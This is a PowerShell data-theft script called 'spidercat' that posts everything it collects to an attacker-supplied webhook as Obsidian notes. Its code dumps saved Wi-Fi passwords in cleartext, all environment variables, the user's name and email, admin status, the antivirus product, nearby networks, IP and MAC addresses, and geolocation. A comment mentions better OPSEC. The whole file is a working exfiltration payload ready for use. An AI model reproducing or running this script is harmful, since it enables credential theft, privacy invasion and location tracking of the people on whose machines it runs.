# spidercat webhook script
# created by : C0SM0

# Change this to your actual webhook URL
$webhook = "WEBHOOK HERE"

# Variables
$account = $env:userprofile.Split('\')[2]
$username = $env:username
$markdown = "$account.md"


# network values
# possible replacement for using curl.exe (better OPSEC)
# $public = Resolve-DnsName -Server ns1.google.com -Type TXT -Name o-o.myaddr.l.google.com | Select-Object -ExpandProperty 'Strings'
$public = curl.exe https://ident.me
$private = (get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1}).ipaddress[0]
$MAC = ipconfig /all | Select-String -Pattern "physical" | select-object -First 1; $MAC = [string]$MAC; $MAC = $MAC.Substring($MAC.Length - 17)

# Functions
# Send content to Obsidian
function Send-ToObsidian {
    param (
        [Parameter(Mandatory = $true)]
        [string]$Message,
        [Parameter(Mandatory = $true)]
        [string]$File
    )

    # Use Invoke-WebRequest for HTTP requests
    Invoke-WebRequest -Uri "$webhook`?path=$file" -Method Post -Body $Message -ContentType "text/plain"
}

# Get full name of the user
function Get-FullName {
    try {
        $fullName = (Net User $Env:username | Select-String -Pattern "Full Name").Line.Split(':')[1].Trim()
    }
    catch {
        Write-Error "No name was detected"
        $fullName = "NA"
    }
    return $fullName
}

# Get email of the user
function Get-Email {
    try {
        $email = (GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})").Matches.Value
    }
    catch {
        Write-Error "An email was not found"
        $email = "No Email Detected"
    }
    return $email
}

# Get IP information
function Get-IPInformation {
    $ipinfo = Invoke-RestMethod -Uri "https://ipinfo.io"
    return $ipinfo
}

# Get Antivirus solution
function Get-AntivirusSolution {
    try {
        $Antivirus = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct -ErrorAction Stop
        $AntivirusSolution = $Antivirus.displayName
    }
    catch {
        Write-Error "Unable to get Antivirus Solution: $_"
        $AntivirusSolution = "NA"
    }
    return $AntivirusSolution
}

# Get environment variables
function Get-EnvironmentVariables {
    $envVars = Get-ChildItem Env: | ForEach-Object {
        [PSCustomObject]@{
            Name = $_.Name
            Value = $_.Value
        }
    }
    return $envVars
}

# Generate markdown for wireless information
function Generate-WirelessMarkdown {
    # Get wireless credentials
    $SSIDS = (netsh wlan show profiles | Select-String ': ' ) -replace ".*:\s+"
    $wifi_info = foreach($SSID in $SSIDS) {
        $Password = (netsh wlan show profiles name=$SSID key=clear | Select-String 'Key Content') -replace ".*:\s+"
        New-Object -TypeName psobject -Property @{"SSID"=$SSID;"Password"=$Password}
    }
    $wifi_json = $wifi_info | ConvertTo-Json | ConvertFrom-Json

    foreach ($wifi in $wifi_json) {
        $content = @"
# $($wifi.SSID)
- SSID : $($wifi.SSID)
- Password : $($wifi.Password)

## Tags
#wifi
"@
        Send-ToObsidian -Message $content -File "$($wifi.SSID).md"
    }
    return $wifi_json
}

# Generate markdown for user information
function Generate-UserMarkdown {
    # General values
    $full_name = Get-FullName
    $email = Get-Email
    $is_admin = (Get-LocalGroupMember 'Administrators').Name -contains "$env:COMPUTERNAME\$env:USERNAME"
    $antivirus = Get-AntivirusSolution
    $envVars = Get-EnvironmentVariables

    # Create markdown content
    $content = @"
# $account

## General
- Full Name : $full_name
- Email : $email

## User Info
- UserName : $username
- UserProfile : $account
- Admin : $is_admin

## PC Information
- Antivirus : $antivirus

## Environment Variables
"@

    foreach ($envVar in $envVars) {
        $content += "- $($envVar.Name) : $($envVar.Value)`n"
    }

    Send-ToObsidian -Message $content -File $markdown

    # Get saved wireless data
    $wifi_json = Generate-WirelessMarkdown

    # Add known connections
    foreach ($wifi in $wifi_json) {
        Send-ToObsidian -Message "- [[$($wifi.SSID)]]" -File $markdown
    }

    # Setup nearby networks
    Send-ToObsidian -Message "`n## Nearby Networks" -File $markdown

    # Attempt to read nearby networks
    try {
        # Get nearby SSIDs
        $nearby_ssids = (netsh wlan show networks mode=Bssid | Where-Object { $_ -like "SSID*" -or $_ -like "*Authentication*" -or $_ -like "*Encryption*" }).Trim()

        # Format and add SSIDs
        foreach ($ssid in $nearby_ssids) {
            if ($ssid -like "SSID*") {
                $formatted_ssid = $ssid.Split(":")[1].Trim().Replace(" ", "")
                Send-ToObsidian -Message "- #$formatted_ssid" -File $markdown
            }
        }
    }
    catch {
        Send-ToObsidian -Message "- No nearby wifi networks detected" -File $markdown
    }

    # IP information
    $ip_information = Get-IPInformation
    Send-ToObsidian -Message "`n## IP Information:$($ip_information | Out-String)" -File $markdown
    $latitude, $longitude = $ip_information.loc.Split(',')
    $city = $ip_information.city.replace(' ', '-')
    $region = $ip_information.region.replace(' ', '-')
    $country = $ip_information.country.replace(' ', '-')
    $organization = $ip_information.org.replace(' ', '-')
    $zipcode = $ip_information.postal
    $timezone = $ip_information.timezone.replace(' ', '-')

    # Write IP info and geolocation
    $content = @"
## Geolocation
<div class="mapouter"><div class="gmap_canvas"><iframe width="600" height="500" id="gmap_canvas" src="https://maps.google.com/maps?q=$latitude,$longitude&t=k&z=13&ie=UTF8&iwloc=&output=embed" frameborder="0" scrolling="no" marginheight="0" marginwidth="0"></iframe><br><style>.mapouter{position:relative;text-align:right;height:500px;width:600px;}</style><style>.gmap_canvas {overflow:hidden;background:none!important;height:500px;width:600px;}</style></div></div>

## Tags
#user #$city #$region #$country #$organization #zip-$zipcode #$timezone
"@
    # Send data set two
    Send-ToObsidian -Message $content -File $markdown
}

# Main execution block
Generate-UserMarkdown
